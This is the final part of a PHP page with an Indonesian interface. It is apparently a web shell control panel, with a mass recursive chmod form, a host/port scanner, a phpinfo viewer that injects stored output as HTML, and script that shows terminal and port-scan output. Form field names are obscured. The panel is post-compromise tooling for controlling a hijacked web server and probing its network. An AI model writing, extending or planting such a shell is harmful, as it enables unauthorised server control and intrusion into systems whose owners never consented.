                            <input type="checkbox" name="k_mRC_mS" id="mass_chmod_recursive" class="form-checkbox h-4 w-4 text-red-600 bg-gray-900 border-gray-600 rounded-sm focus:ring-red-500 mr-2">
                            <label for="mass_chmod_recursive" class="text-gray-300 text-sm">Terapkan Rekursif</label>
                        </div>
                        <button type="submit" name="k_mCMOD" value="1" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">
                            <i class="fa-solid fa-shield-halved mr-1"></i> Jalankan CHMOD Massal
                        </button>
                    </div>

                    <div class="flex justify-end pt-2">
                        <button type="button" onclick="closeModal('massActionModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Batal</button>
                    </div>
                </form>
            </div>
        </div>

        <div id="portScanModal" class="modal fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-content p-6 rounded-xl w-full max-w-md shadow-2xl">
                <h2 class="text-2xl font-bold mb-4 text-indigo-500">Port Scanner</h2>
                <form method="POST" class="space-y-4">
                    <input type="text" name="k_pSHS" placeholder="Host/IP (mis: localhost atau 127.0.0.1)" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-500 text-white">
                    <input type="text" name="k_pSPT" placeholder="Port (mis: 80,443,21,22)" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-500 text-white">
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeModal('portScanModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Batal</button>
                        <button type="submit" class="bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Scan Port</button>
                    </div>
                </form>
            </div>
        </div>

        <div id="phpinfoModal" class="modal fixed inset-0 z-50 flex items-center justify-center hidden">
            <div class="modal-content p-6 rounded-xl w-full max-w-4xl h-[90vh] shadow-2xl overflow-y-auto">
                <h2 class="text-2xl font-bold mb-4 text-purple-500">PHP Information</h2>
                <div id="phpinfoContent" class="overflow-x-auto">
                    Loading PHP Info...
                </div>
                <input type="hidden" id="phpinfoRawContent" value="<?php echo isset($_SESSION['sS_pOuT']) ? htmlspecialchars($_SESSION['sS_pOuT']) : ''; ?>">
                <?php unset($_SESSION['sS_pOuT']); ?>
                <div class="flex justify-end mt-4">
                    <button type="button" onclick="closeModal('phpinfoModal')" class="bg-gray-600 hover:bg-gray-700 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">Tutup</button>
                </div>
            </div>
        </div>
        
    </div>

    <script>
        function openModal(id) {
            document.getElementById(id).classList.remove('hidden');
        }

        function closeModal(id) {
            document.getElementById(id).classList.add('hidden');
        }

        function toggleAccordion(id) {
            const content = document.getElementById(id);
            const icon = document.getElementById(id.replace('Content', 'Icon'));
            if (content.style.display === 'block') {
                content.style.display = 'none';
                icon.classList.remove('fa-chevron-up');
                icon.classList.add('fa-chevron-down');
            } else {
                content.style.display = 'block';
                icon.classList.remove('fa-chevron-down');
                icon.classList.add('fa-chevron-up');
            }
        }

        function openRenameModal(oldName, encodedOldName) {
            document.getElementById('current_display_name').textContent = oldName;
            document.getElementById('rename_old_name').value = encodedOldName;
            document.getElementById('rename_new_input').value = oldName;
            openModal('renameModal');
        }

        function openChmodModal(itemName, encodedItem, currentPermsRaw, isDir) {
            document.getElementById('chmod_item_name').textContent = itemName;
            document.getElementById('chmod_item_encoded').value = encodedItem;
            document.getElementById('chmod_current_perms').textContent = currentPermsRaw;
            document.getElementById('chmod_mode_input').value = currentPermsRaw.slice(-3);
            
            const recursiveCheckbox = document.getElementById('chmod_recursive');
            if (isDir) {
                recursiveCheckbox.checked = false; 
                recursiveCheckbox.parentElement.classList.remove('hidden');
            } else {
                recursiveCheckbox.checked = false;
                recursiveCheckbox.parentElement.classList.add('hidden');
            }
            openModal('chmodModal');
        }

        function validateMassAction(form) {
            const selectedCount = document.querySelectorAll('input[name="selected_items[]"]:checked').length;
            const targetAction = document.activeElement.name;

            if (selectedCount === 0) {
                alert("Peringatan: Anda belum memilih item apapun untuk aksi massal ini.");
                return false;
            }

            if (targetAction === 'k_mCMOD') {
                const modeInput = document.getElementById('mass_chmod_mode').value.trim();
                const modeRegex = /^[0-7]{3,4}$/;
                if (!modeRegex.test(modeInput)) {
                    alert("Error: Mode CHMOD massal tidak valid. Harusnya angka oktal (misal: 0755).");
                    return false;
                }
            }
            
            const selectedItems = document.querySelectorAll('input[name="selected_items[]"]:checked');
            selectedItems.forEach(item => {
                const hiddenInput = document.createElement('input');
                hiddenInput.type = 'hidden';
                hiddenInput.name = 'k_sLIT[]';
                hiddenInput.value = item.value;
                form.appendChild(hiddenInput);
            });
            
            return true;
        }

        const selectAll = document.getElementById('selectAll');
        const checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
        
        selectAll.addEventListener('change', function() {
            checkboxes.forEach(cb => {
                cb.checked = this.checked;
            });
            updateMassActionButton();
        });

        checkboxes.forEach(cb => {
            cb.addEventListener('change', updateMassActionButton);
        });

        function updateMassActionButton() {
            const checkedCount = document.querySelectorAll('input[name="selected_items[]"]:checked').length;
            const massActionButton = document.getElementById('massActionButton');
            const selectedCountSpan = document.getElementById('selectedCount'); 
            
            if (selectedCountSpan) {
                selectedCountSpan.textContent = checkedCount;
            }

            if (checkedCount > 0) {
                massActionButton.classList.remove('opacity-50', 'cursor-not-allowed');
                massActionButton.disabled = false;
                massActionButton.innerHTML = '<i class="fa-solid fa-screwdriver-wrench mr-1"></i> Aksi Massal (' + checkedCount + ' dipilih)';
            } else {
                massActionButton.classList.add('opacity-50', 'cursor-not-allowed');
                massActionButton.disabled = true;
                massActionButton.innerHTML = '<i class="fa-solid fa-screwdriver-wrench mr-1"></i> Aksi Massal (0 dipilih)';
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const terminalOutput = document.querySelector('.terminal-output');
            const portscanOutput = document.querySelector('.terminal-output + .terminal-output'); 
            const content = document.getElementById('systemInfoContent');
            const icon = document.getElementById('systemInfoIcon');

            if (terminalOutput || portscanOutput) {
                 content.style.display = 'block';
                 icon.classList.remove('fa-chevron-down');
                 icon.classList.add('fa-chevron-up');
            } else {
                 content.style.display = 'none';
                 icon.classList.remove('fa-chevron-up');
                 icon.classList.add('fa-chevron-down');
            }
            
            updateMassActionButton();

            const phpinfoRawContent = document.getElementById('phpinfoRawContent').value;
            if (phpinfoRawContent.trim().length > 0) {
                document.getElementById('phpinfoContent').innerHTML = phpinfoRawContent;
                openModal('phpinfoModal');
            }
        });
    </script>
</body>
</html>
